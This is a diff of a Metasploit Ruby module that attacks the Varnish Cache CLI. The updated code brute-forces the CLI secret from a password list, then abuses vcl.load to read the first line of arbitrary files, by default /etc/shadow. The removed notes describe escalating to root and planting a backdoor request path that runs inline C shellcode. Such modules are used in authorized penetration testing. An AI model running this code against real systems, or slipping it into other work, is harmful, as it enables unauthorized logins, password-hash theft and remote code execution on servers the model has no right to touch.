@@ -4,164 +4,136 @@
 ##
 
 require 'msf/core'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/varnish'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
-  include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'           => 'Varnish Cache CLI Interface Bruteforce Utility',
+      'Name'           => 'Varnish Cache CLI Login Utility and File Read',
       'Description'    => 'This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce
-                           list of passwords. This module will also attempt to read the /etc/shadow root password hash
-                           if a valid password is found. It is possible to execute code as root with a valid password,
-                           however this is not yet implemented in this module.',
+                           list of passwords. This module will also cause an error in Varnish by load an arbitrary file
+                           in order to read the first line of content from the insuing error message.',
       'References'     =>
         [
           [ 'OSVDB', '67670' ],
           [ 'CVE', '2009-2936' ],
-          # General
-          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ],
-          [ 'CVE', '1999-0502'] # Weak password
+          [ 'EDB', '35581' ],
+          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ]
         ],
-      'Author'         => [ 'patrick' ],
+      'Author'         =>
+        [
+          'patrick', #original module
+          'h00die <mike@shorebreaksecurity.com>' #updates and standardizations
+        ],
       'License'        => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(6082),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "unix_passwords.txt") ]),
+        OptPath.new('PASS_FILE',  [ false, 'File containing passwords, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ]),
+        OptPath.new('FILE', [true, 'File to retrieve first line of', '/etc/shadow']),
+        OptString.new('USERNAME', [false, 'A specific username to authenticate as', '<BLANK>']),
+        OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false])
       ], self.class)
 
-    deregister_options('USERNAME', 'USER_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS')
+    # no username, only a shared key aka password
+    #deregister_options('USERNAME', 'USER_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS')
+
+    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any
+    # usernames that are passed in.
+    @strip_usernames = true
+  end
+  
+  def setup
+    super
+    # They must select at least blank passwords, provide a pass file or a password
+    one_required = %w(BLANK_PASSWORDS PASS_FILE PASSWORD)
+    unless one_required.any? { |o| datastore.has_key?(o) && datastore[o] }
+      fail_with(Failure::BadConfig, "Invalid options: One of #{one_required.join(', ')} must be set")
+    end
+    if !datastore['PASS_FILE']
+      if !datastore['BLANK_PASSWORDS'] && datastore['PASSWORD'].blank?
+        fail_with(Failure::BadConfig, "PASSWORD or PASS_FILE must be set to a non-empty string if not BLANK_PASSWORDS")
+      end
+    end
+  end
+
+  def read_file(password)
+    connect
+    sock.put("auth #{Rex::Text.rand_text_alphanumeric(3)}\n") # Cause a login fail.
+    res = sock.get_once(-1,3) # grab challenge
+    if res && res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./ # 107 auth
+      challenge = $1
+      response = challenge + "\n"
+      response << password + "\n"
+      response << challenge + "\n"
+      response = Digest::SHA256.hexdigest(response)
+      sock.put("auth #{response}\n")
+      res = sock.get_once(-1,3)
+    end
+    sock.put("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} #{datastore['FILE']}\n") # only returns 1 line of any target file.
+    res = sock.get_once(-1,3)
+
+    # example format from /etc/shadow on an ubuntu box
+    # Message from VCC-compiler:
+    # Syntax error at
+    # ('input' Line 1 Pos 5)
+    # root:!:17123:0:99999:7:::
+    # ----#--------------------
+
+    if res && res =~ /\('input' Line \d Pos \d\)\n(...+)\n/
+      print_good("First line of #{datastore['FILE']}: #{$1}:")
+    else
+      vprint_error("Unable to read #{datastore['FILE']}:\n#{res}\n")
+    end
+    disconnect
   end
 
   def run_host(ip)
+    cred_collection = Metasploit::Framework::CredentialCollection.new(
+      pass_file: datastore['PASS_FILE'],
+      username: ''
+    )
+    vprint_status('made cred collector')
+    scanner = Metasploit::Framework::LoginScanner::VarnishCLI.new(
+      host: ip,
+      port: rport,
+      cred_details: cred_collection,
+      stop_on_success: true,
+      connection_timeout: 10,
+      framework: framework,
+      framework_module: self,
+
+    )
+    vprint_status('made scanner')
+    scanner.scan! do |result|
+      print(result)
+      credential_data = result.to_h
+      credential_data.merge!(
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
+      )
+      if result.success?
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
+
+        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential.private}"
         connect
-        res = sock.get_once(-1,3) # detect banner
-          if (res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./) # 107 auth
-            vprint_status("Varnishd CLI detected - authentication required.")
-            each_user_pass { |user, pass|
-            sock.put("auth #{Rex::Text.rand_text_alphanumeric(3)}\n") # Cause a login fail.
-            res = sock.get_once(-1,3) # grab challenge
-            if (res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./) # 107 auth
-              challenge = $1
-              secret = pass + "\n" # newline is needed
-              response = challenge + "\n" + secret + challenge + "\n"
-              response = Digest::SHA256.hexdigest(response)
-              sock.put("auth #{response}\n")
-              res = sock.get_once(-1,3)
-              if (res =~ /107 \d+/) # 107 auth
-                vprint_status("FAILED: #{secret}")
-              elsif (res =~ /200 \d+/) # 200 ok
-                print_good("GOOD: #{secret}")    
-                
-                report_auth_info(
-                  :host => rhost,
-                  :port => rport,
-                  :sname => ('varnishd'),
-                  :pass => pass,
-                  :proof => "#{res}",
-                  :source_type => "user_supplied",
-                  :active => true
-                )
-                              
-                sock.put("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} /etc/shadow\n") # only returns 1 line of any target file.
-                res = sock.get_once(-1,3)
-                if (res =~ /root:([\D\S]+):/) # lazy.
-                  if ($1[0] == "!")
-                    vprint_error("/etc/shadow root uid is disabled.\n")
-                  else
-                    print_good("/etc/shadow root enabled:\nroot:#{$1}:")
-                  end
-                else
-                  vprint_error("Unable to read /etc/shadow?:\n#{res}\n")
-                end
-                
-                break
-              else
-                vprint_error("Unknown response:\n#{res}\n")
-              end
-            end
-            }
-          elsif (res =~ /Varnish Cache CLI 1.0/)
-            print_good("Varnishd CLI does not require authentication!")
-          else
-            vprint_error("Unknown response:\n#{res}\n")
-          end
+        read_file(result.credential.private)
         disconnect
+      else
+        invalidate_login(credential_data)
+        vprint_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential.private} (#{result.status})"
+      end
     end
+  end
 end
-
-=begin
-
-aushack notes:
-
-- varnishd typically runs as root, forked as unpriv.
-- 'param.show' lists configurable options.
-- 'cli_timeout' is 60 seconds. param.set cli_timeout 99999 (?) if we want to inject payload into a client thread and avoid being killed.
-- 'user' is nobody. param.set user root (may have to stop/start the child to activate)
-- 'group' is nogroup. param.set group root (may have to stop/start the child to activate)
-- (unless varnishd is launched with -r user,group (read-only) implemented in v4, which may make priv esc fail).
-- vcc_unsafe_path is on. used to 'import ../../../../file' etc.
-- vcc_allow_inline_c is off. param.set vcc_allow_inline_c on to enable code execution.
-- code execution notes:
-
-* quotes must be escaped \"
-* \n is a newline
-* C{ }C denotes raw C code.
-* e.g. C{ unsigned char shellcode[] = \"\xcc\"; }C
-* #import <stdio.h> etc must be "newline", i.e. C{ \n#include <stdlib.h>\n dosomething(); }C (without 2x \n, include statement will not interpret correctly).
-* C{ asm(\"int3\"); }C can be used for inline assembly / shellcode.
-* varnishd has it's own 'vcl' syntax. can't seem to inject C randomly - must fit VCL logic.
-* example trigger for backdoor:
-
-VCL server:
-  vcl.inline foo "vcl 4.0;\nbackend b { . host = \"127.0.0.1\";  } sub vcl_recv { if (req.url ~ \"^/backd00r\") { C{ asm(\"int3\"); }C } } \n"
-  vcl.use foo
-  start
-
-Attacker:
-  telnet target 80
-  GET /backd00r HTTP/1.1
-  Host: 127.0.0.1
-
-(... wait for child to execute debug trap INT3 / shellcode).
-
-CLI protocol notes from website:
-
-The CLI protocol used on the management/telnet interface is a strict request/response protocol, there are no unsolicited transmissions from the responding end.
-
-Requests are whitespace separated tokens terminated by a newline (NL) character.
-
-Tokens can be quoted with "..." and common backslash escape forms are accepted: (\n), (\r), (\t), (
-), (\"), (\%03o) and (\x%02x)
-
-The response consists of a header which can be read as fixed format or ASCII text:
-
-    1-3      %03d      Response code
-    4        ' '       Space
-    5-12     %8d       Length of body
-    13       \n        NL character.
-Followed by the number of bytes announced by the header.
-
-The Responsecode is numeric shorthand for the nature of the reaction, with the following values currently defined in include/cli.h:
-
-enum cli_status_e {
-        CLIS_SYNTAX     = 100,
-        CLIS_UNKNOWN    = 101,
-        CLIS_UNIMPL     = 102,
-        CLIS_TOOFEW     = 104,
-        CLIS_TOOMANY    = 105,
-        CLIS_PARAM      = 106,
-        CLIS_OK         = 200,
-        CLIS_CANT       = 300,
-        CLIS_COMMS      = 400,
-        CLIS_CLOSE      = 500
-};
-=end
